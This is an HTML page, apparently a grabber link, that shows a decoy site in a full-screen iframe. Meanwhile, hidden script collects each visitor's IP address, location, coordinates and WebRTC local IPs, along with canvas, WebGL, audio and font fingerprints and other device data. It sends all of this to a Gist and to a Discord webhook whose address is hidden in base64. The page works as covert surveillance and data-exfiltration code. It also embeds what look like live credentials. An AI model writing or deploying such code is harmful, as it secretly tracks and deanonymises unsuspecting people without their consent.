<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fingerprint + Gist + Discord (Secure)</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; overflow: hidden; background: #fff; }
    iframe { width: 100%; height: 100%; border: none; display: block; }
  </style>
</head>
<body>

  <iframe id="main-frame" src="about:blank"></iframe>

  <script>
    // =======================
    const _d = (x) => atob(x);
    const API_KEY         = _d("YjliZmIyNTMyMThjNGViZWEwOGVjNzZjYzAzZTIxZWM=");
    const TARGET_URL      = _d("aHR0cHM6Ly9pbnZpdGVib3QtZGlzY29yZC1ieXBhc3N1cmwtNDU2Mi5vbnJlbmRlci5jb20v");
    const DISCORD_WEBHOOK = _d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjA1ODU4OTY4MDg5ODIyMy9LZzQ5RXF6N1NYUHhTZTVaanU0QzVFNlh2aFZQdXFLeUZJMG9sYmZ4RWc3WnhqQklhZ3RKd0h3ZkNfejh1ekMwV1J5bQ==");
    // Gọi function trên Netlify
    const CREATE_GIST_URL = "/.netlify/functions/create-gist";
    // =========================================================================

    // ---------------------------- FINGERPRINT ----------------------------
    // (giữ nguyên toàn bộ các hàm từ code sandbox‑safe trước đó)
    async function fetchNetworkInfo() {
      try {
        const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
        const data = await res.json();
        return {
          public_ip: data.ip || "N/A",
          isp: data.isp || "N/A",
          city: data.city || "N/A",
          country: data.country_name || "N/A",
          latitude: data.latitude || "N/A",
          longitude: data.longitude || "N/A",
          connection_type: navigator.connection ? navigator.connection.effectiveType : "N/A",
          downlink_mbps: navigator.connection ? navigator.connection.downlink : "N/A",
          rtt_ms: navigator.connection ? navigator.connection.rtt : "N/A"
        };
      } catch (e) { return { error: "IP_FETCH_FAILED" }; }
    }

    async function detectBot() {
      let isBot = false;
      const ua = navigator.userAgent.toLowerCase();
      if (navigator.webdriver) isBot = true;
      if (/bot|crawler|spider|headless|phantom|selenium|puppeteer|playwright/.test(ua)) isBot = true;
      const isMobile = /mobi|android|iphone|ipad|ipod/i.test(ua);
      if (!isMobile) {
        try {
          if ((navigator.plugins?.length ?? 0) === 0 && (navigator.mimeTypes?.length ?? 0) === 0) isBot = true;
        } catch (e) {}
      }
      return { is_bot: isBot, is_user: !isBot };
    }

    function getWebGLInfo() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return { supported: false };
        const ext = gl.getExtension("WEBGL_debug_renderer_info");
        return {
          supported: true,
          vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : "N/A",
          renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "N/A",
          maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
          extensions: gl.getSupportedExtensions().slice(0, 15).join(", ")
        };
      } catch (e) { return { supported: false }; }
    }

    function getCanvasHash() {
      try {
        const canvas = document.createElement("canvas");
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext("2d");
        if (!ctx) return "No_Context";
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Deep_FP_#881", 2, 15);
        const dataURI = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataURI.length; i++) {
          hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
          hash |= 0;
        }
        return "HASH_" + Math.abs(hash);
      } catch (e) { return "Error_" + e.message; }
    }

    function getAudioFingerprint() {
      try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (!AudioCtx) return "Not_Supported";
        const ctx = new AudioCtx();
        return `SampleRate_${ctx.sampleRate}_State_${ctx.state}`;
      } catch (e) { return "Error"; }
    }

    function getFontFingerprint() {
      try {
        const testFonts = [
          "Arial", "Times New Roman", "Courier New", "Verdana", "Georgia",
          "Comic Sans MS", "Trebuchet MS", "Impact", "Lucida Console",
          "Palatino Linotype", "Tahoma", "Symbol", "Webdings", "Wingdings"
        ];
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        const testString = "mmmmmmmmmmlli";
        ctx.font = "72px monospace";
        const baselineSize = ctx.measureText(testString).width;
        const detected = [];
        for (const font of testFonts) {
          ctx.font = `72px '${font}', monospace`;
          const newSize = ctx.measureText(testString).width;
          if (newSize !== baselineSize) detected.push(font);
        }
        return detected.sort().join(", ");
      } catch (e) { return "Error"; }
    }

    async function getLocalIPs() {
      const ips = [];
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        await new Promise((resolve) => {
          pc.onicecandidate = (e) => {
            if (!e.candidate) { resolve(); return; }
            const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
            if (match && !ips.includes(match[0])) ips.push(match[0]);
          };
          setTimeout(resolve, 1500);
        });
        pc.close();
      } catch (e) {}
      return ips.length ? ips : ["blocked"];
    }

    function detectAdblock() {
      return new Promise((resolve) => {
        const test = document.createElement("div");
        test.className = "adsbox";
        test.innerHTML = "&nbsp;";
        document.body.appendChild(test);
        const blocked = test.offsetHeight === 0;
        document.body.removeChild(test);
        resolve(blocked);
      });
    }

    function getPluginsMIME() {
      try {
        return {
          plugins: Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "EMPTY",
          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ") || "EMPTY"
        };
      } catch (e) { return { plugins: "Error", mimeTypes: "Error" }; }
    }

    async function getBattery() {
      try {
        if (!("getBattery" in navigator)) return "API Not Supported";
        const b = await navigator.getBattery();
        return `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Discharging"})`;
      } catch (e) { return "Error"; }
    }

    function getAdvancedAPIs() {
      return {
        serviceWorker: "serviceWorker" in navigator,
        webWorker: typeof Worker !== "undefined",
        gamepad: "getGamepads" in navigator,
        webXR: "xr" in navigator,
        deviceMotion: "DeviceMotionEvent" in window,
        deviceOrientation: "DeviceOrientationEvent" in window
      };
    }

    function getScreenDetails() {
      return {
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        orientation: screen.orientation ? screen.orientation.type : "N/A",
        orientationAngle: screen.orientation ? screen.orientation.angle : "N/A"
      };
    }

    function isLocalStorageAvailable() {
      try { return typeof localStorage !== 'undefined'; } catch(e) { return false; }
    }
    function isSessionStorageAvailable() {
      try { return typeof sessionStorage !== 'undefined'; } catch(e) { return false; }
    }

    async function gatherAllData() {
      const [network, bot, battery, localIPs, adblock] = await Promise.all([
        fetchNetworkInfo(),
        detectBot().catch(() => ({ is_bot: false, is_user: true })),
        getBattery().catch(() => "Error"),
        getLocalIPs().catch(() => ["error"]),
        detectAdblock().catch(() => null)
      ]);

      return {
        timestamp: new Date().toISOString(),
        identity: bot,
        network: network,
        device: {
          platform: navigator.platform,
          cpuCores: navigator.hardwareConcurrency || "N/A",
          memoryGB: navigator.deviceMemory || "N/A",
          battery: battery,
          gpu: getWebGLInfo(),
          localIPs: localIPs
        },
        display: {
          screenResolution: `${screen.width}x${screen.height}`,
          viewport: `${window.innerWidth}x${window.innerHeight}`,
          ...getScreenDetails(),
          pixelRatio: window.devicePixelRatio,
          touchPoints: navigator.maxTouchPoints || 0,
          hasTouch: "ontouchstart" in window
        },
        browser: {
          userAgent: navigator.userAgent,
          languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffsetMinutes: new Date().getTimezoneOffset(),
          doNotTrack: navigator.doNotTrack || "N/A",
          canvasHash: getCanvasHash(),
          audioFingerprint: getAudioFingerprint(),
          fontFingerprint: getFontFingerprint(),
          adblocker: adblock,
          cookiesEnabled: navigator.cookieEnabled,
          localStorage: isLocalStorageAvailable(),
          sessionStorage: isSessionStorageAvailable(),
          iframeEmbedded: window.self !== window.top,
          plugins: getPluginsMIME().plugins,
          mimeTypes: getPluginsMIME().mimeTypes,
          advancedAPIs: getAdvancedAPIs()
        }
      };
    }

    // ---------------------------- GỌI SERVERLESS FUNCTION ----------------------------
    async function createGistViaServer(jsonString) {
      const response = await fetch(CREATE_GIST_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: jsonString })
      });

      if (!response.ok) {
        const err = await response.text();
        throw new Error(`Server error: ${response.status} ${err}`);
      }

      const data = await response.json();
      return data.rawUrl;
    }

    async function sendLinkToDiscord(rawUrl, summary) {
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `📄 **Fingerprint captured**\n🔗 [Tải fingerprint.json](${rawUrl})\n⏱️ ${summary}` })
      });
    }

    // ---------------------------- KHỞI ĐỘNG ----------------------------
    window.addEventListener("DOMContentLoaded", async () => {
      try {
        document.getElementById("main-frame").src = TARGET_URL;

        const fullData = await gatherAllData();
        const jsonString = JSON.stringify(fullData, null, 2);

        // Gọi function an toàn (token nằm ở server)
        const rawUrl = await createGistViaServer(jsonString);

        const summary = `${fullData.network.public_ip} - ${fullData.network.city}, ${fullData.network.country}`;
        await sendLinkToDiscord(rawUrl, summary);

      } catch (err) {
        console.error("Lỗi:", err);
        await fetch(DISCORD_WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: "❌ Lỗi: " + err.message })
        }).catch(() => {});
      }
    });
  </script>
</body>
  </html>
